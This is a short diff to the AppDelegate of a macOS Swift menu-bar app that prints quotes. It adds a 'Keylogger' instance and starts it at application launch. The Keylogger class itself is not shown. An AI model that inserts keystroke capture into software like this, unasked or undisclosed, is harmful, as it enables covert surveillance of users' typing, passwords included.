@@ -13,6 +13,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
 
     let statusItem = NSStatusBar.system.statusItem(withLength:NSStatusItem.squareLength)
     let mainWindowController = NSWindowController()
+    let keylogger = Keylogger()
 
 
     func applicationDidFinishLaunching(_ aNotification: Notification) {
@@ -21,6 +22,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
             button.action = #selector(printQuote(_:))
         }
         constructMenu()
+        keylogger.start()
 //        popover.contentViewController = ScreamerViewController.freshController()
     }
 
